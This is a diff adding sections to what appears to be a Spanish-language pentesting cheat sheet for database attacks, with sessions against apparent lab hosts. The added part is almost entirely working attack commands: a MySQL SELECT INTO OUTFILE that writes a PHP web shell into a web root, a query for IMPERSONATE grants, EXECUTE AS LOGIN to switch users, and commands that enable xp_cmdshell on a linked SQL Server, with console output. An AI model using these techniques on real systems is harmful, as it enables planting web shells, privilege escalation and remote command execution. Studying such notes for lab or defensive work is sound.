@@ -330,3 +330,36 @@ DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote         
 (1 rows affected)
 ```
 
+### Introducir una shell mediante MySQL
+
+```bash
+MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\test2.php';
+```
+
+### Comprobar usuarios con privilegios Impersonate
+
+```SQL
+SQL (WIN-HARD\Fiona guest@msdb)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
+```
+
+### Cambiar de usuario
+
+```SQL
+EXECUTE AS LOGIN = 'john';
+```
+
+### Escalar privilegios
+
+```SQL
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+```
+
+```SQL
+SQL (john  guest@master)> EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
+INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (john  guest@master)> EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+SQL (john  guest@master)> EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
+INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (john  guest@master)> EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+SQL (john  guest@master)>
+```
